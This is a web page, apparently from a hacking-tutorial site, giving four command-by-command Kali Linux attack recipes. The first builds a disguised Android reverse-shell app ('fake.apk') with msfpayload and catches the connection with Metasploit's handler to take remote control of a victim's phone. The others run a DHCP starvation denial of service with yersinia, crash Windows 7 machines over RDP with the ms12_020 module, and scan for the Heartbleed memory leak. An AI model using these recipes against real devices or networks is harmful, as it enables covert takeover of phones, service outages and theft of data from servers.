<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	<title>Kali-1</title>
	<base href="{{base_url}}" />
			<meta name="viewport" content="width=1333" />
		<meta name="description" content="How to remotely control android device" />
	<meta name="keywords" content="How to remotely control android device" />
		<meta name="generator" content="Zyro - Website Builder" />
	
	<link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="css/bootstrap-responsive.min.css" rel="stylesheet" type="text/css" />
	<script src="js/jquery-1.8.3.min.js" type="text/javascript"></script>
	<script src="js/bootstrap.min.js" type="text/javascript"></script>
	<script src="js/main.js" type="text/javascript"></script>

	<link href="css/site.css?v=1.0.12" rel="stylesheet" type="text/css" />
	<link href="css/common.css?ts=1433839389" rel="stylesheet" type="text/css" />
	<link href="css/11.css?ts=1433839389" rel="stylesheet" type="text/css" />
	<link rel="shortcut icon" href="http://haktuts.com/gallery/icon-ts1413278622.png" type="image/png" /><meta name="google-site-verification" content="google6bc4eec58925fc74.html" />
	<script type="text/javascript">var currLang = '';</script>		
	<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
	<!--[if lt IE 9]>
	  <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->
</head>


<body>{{ga_code}}<div class="root"><div class="vbox wb_container" id="wb_header">
	
<div id="wb_element_instance1472" class="wb_element"><ul class="hmenu"><li><a href="Home/" target="_self" title="Home">Home</a></li><li><a href="Free-ethical-hacking-course-online/" target="_self" title="Ethical Hacking">Ethical Hacking</a></li><li><a href="Linux/" target="_self" title="Linux">Linux</a></li><li><a href="Tips-and-tricks/" target="_self" title="Tips and Trick ">Tips and Trick </a><ul><li><a href="how-to-share-internet-without-wifi/" target="_self" title="Windows">Windows</a></li><li><a href="basic-windows-command/" target="_self" title="Windows Shortcut">Windows Shortcut</a></li><li><a href="top-20-notepad-trick/" target="_self" title="Notepad Hacking">Notepad Hacking</a></li><li><a href="list-of-top-cydia-tweaks-for-ios/" target="_self" title="iOS">iOS</a></li><li><a href="how-to-install-kali-linux-nethunter/" target="_self" title="Android">Android</a></li></ul></li><li><a href="download-all-hacking-tools/" target="_self" title="Download">Download</a></li><li><a href="Contact-us/" target="_self" title="Contact us">Contact us</a></li><li><a href="Book/" target="_self" title="Book">Book</a></li><li><a href="Earn-Money/" target="_self" title="Earn Money">Earn Money</a></li><li><a href="http://haktuts.blogspot.in" target="_self" title="Blog">Blog</a></li><li><a href="https://cse.google.com/cse/publicurl?cx=001639366659799729802:vr921b1tgry#gsc.tab=0&amp;gsc.q=haktuts&amp;gsc.sort=" target="_blank" title="Hackers Search Engine">Hackers Search Engine</a></li></ul></div><div id="wb_element_instance1473" class="wb_element"><div></div></div><div id="wb_element_instance1474" class="wb_element"><a class="wb_button" href="Home/"><span>HaKTuts</span></a></div><div id="wb_element_instance1478" class="wb_element"><a class="wb_button" href=""><span>HaKTuts</span></a></div></div>
<div class="vbox wb_container" id="wb_main">
	
<div id="wb_element_instance1475" class="wb_element" style=" overflow: hidden;"><script id="airpushScript" type="text/javascript" src="//ab.airpush.com/apportal/client/airpush.js?siteid=263411&amp;testmode=0&amp;banner360=1&amp;banner=slot1&amp;placementid=0&amp;tp=0">
</script><style type="text/css">
            button{
                width: 250px;
                height: 250px;
                
            }
            table{
                border: 0;

            }
            body{
                margin: 0;
                padding: 0;
            }
        </style><table><tbody><tr><td id="error" style="color: red">
                          <img src="https://airpushmarketing.s3.amazonaws.com/abstract_examples_web.gif" width="250px"></td>
                    </tr></tbody></table></div><div id="wb_element_instance1476" class="wb_element"><div style="font-size: 1px; overflow: hidden; line-height: 1px; padding: 0; background: transparent; float: none; position: relative; margin: 1px 0 0 0; width: 100%; height: 1px; left: 0; top: 50%; border-top: 1px solid #303030;"></div></div><div id="wb_element_instance1479" class="wb_element" style=" line-height: normal;"><h1 class="wb-stl-heading1">How to get remote control of android device using kali linux.</h1>

<p class="wb-stl-normal"><br><br>
1. Start terminal and type:<br>
msfpayload android/meterpreter/reverse_tcp LHOST=192.168.0.2 LPORT=81 R &gt; fake.apk<br>
[ Lhost=attacker IP address,lport=local port ]<br>
This command will generate fake.apk in home directory.<br>
2.  Type: msfconsole<br>
This command will start the metasploit framework.<br>
3. Type: use exploit/multi/handler<br>
In order to get multiple session on a single multi/handler.<br>
4. Type: set payload android/meterpreter/reverse_tcp<br>
This will provide the reverse connection from victim to attacker computer.<br>
5. Type: show options<br>
It will show  the available options  like  lhost,lport<br>
6. Set LHOST=192.168.0.2<br>
7. Set LPORT=81<br>
8. EXPLOIT</p>

<h2 class="wb-stl-heading2"><br><br><br>
How to perform DHCP DOS attack using yersinia in kali linux.</h2>

<p class="wb-stl-normal"><br>
1. Start terminal and type: yersinia-G  (This will bring up the GUI of yersinia).<br>
2. Now goto DHCP tab<br>
3. Duble click on DHCP<br>
4. Now ,Choose attack pop on your screen<br>
5. Select sending DISCOVER packet<br>
6. Click “ok”</p>

<p class="wb-stl-normal"><br>
How Yesinia Works???</p>

<p class="wb-stl-normal"><br>
Whenever user power up the machine it start searching the IP address. DHCP server offer the machine for IP address,as and when our machine respond to the request  of DHCP server. DHCP server provide the IP address from its pool and allocate it your machine mac address.<br>
So yersinia send many discover packet to DHCP server using different MAC Address so all the free IP in DHCP server used ,so genuine request from machine would be unsatisfied.</p>

<h3 class="wb-stl-heading3"><br><br>
Steps to perform blue screen of death attack on remote windows 7 PC.</h3>

<p class="wb-stl-normal"><br>
1. Open Kali Linux terminal type msfconsole<br>
2. Now type use auxiliary/dos/windows/rdp/ms12_020_maxchannelids<br>
3. msf auxiliary(ms12_020_maxchannelids) &gt; show options<br>
4. msf auxiliary(ms12_020_maxchannelids) &gt; set RHOST 192.168..1.25<br>
5. msf auxiliary(ms12_020_maxchannelids) &gt; show options<br>
6. msf auxiliary(ms12_020_maxchannelids) &gt; exploit</p>

<p class="wb-stl-normal"><br>
Note:This exploit will work till windows 7 sp1</p>

<h3 class="wb-stl-heading3"><br><br><br>
How to perform openSSL heartbleed attack in kali linux. </h3>

<p class="wb-stl-normal"><br>
1.Open Kali linux<br>
2.Run Metaspolit through terminal: msfconsole<br>
3. type:-  use auxiliary/scanner/ssl/openssl_heartbleed<br>
4. msf auxiliary(openssl_heartbleed) &gt; show options<br>
5. msf auxiliary(openssl_heartbleed) &gt; set RHOST &lt;Host Add&gt;<br>
6. msf auxiliary(openssl_heartbleed) &gt; set RPORT 443<br>
7. msf auxiliary(openssl_heartbleed) &gt; set VERBOSE  true<br>
8. msf auxiliary(openssl_heartbleed) &gt; show options<br>
9. msf auxiliary(openssl_heartbleed) &gt; Run<br><br><br><br><br>
 </p>
</div><div id="wb_element_instance1480" class="wb_element" style="width: 100%;">
			<?php
				global $show_comments;
				if (isset($show_comments) && $show_comments) {
					renderComments(11);
			?>
			<script type="text/javascript">
				$(function() {
					var block = $("#wb_element_instance1480");
					var comments = block.children(".wb_comments").eq(0);
					var contentBlock = $("#wb_main");
					contentBlock.height(contentBlock.height() + comments.height());
				});
			</script>
			<?php
				} else {
			?>
			<script type="text/javascript">
				$(function() {
					$("#wb_element_instance1480").hide();
				});
			</script>
			<?php
				}
			?>
			</div></div>
<div class="vbox wb_container" id="wb_footer" style="height: 161px;">
	
<div id="wb_element_instance1477" class="wb_element" style=" line-height: normal;"><h4 class="wb-stl-pagetitle">haktuts © 2014. All Rights Reserved </h4>
</div><div id="wb_element_instance1481" class="wb_element" style="text-align: center; width: 100%;"><div class="wb_footer"></div><script type="text/javascript">
			$(function() {
				var footer = $(".wb_footer");
				var html = (footer.html() + "").replace(/^\s+|\s+$/g, "");
				if (!html) {
					footer.parent().remove();
					footer = $("#wb_footer");
					footer.height(100);
				}
			});
			</script></div></div><div class="wb_sbg"></div></div></body>
</html>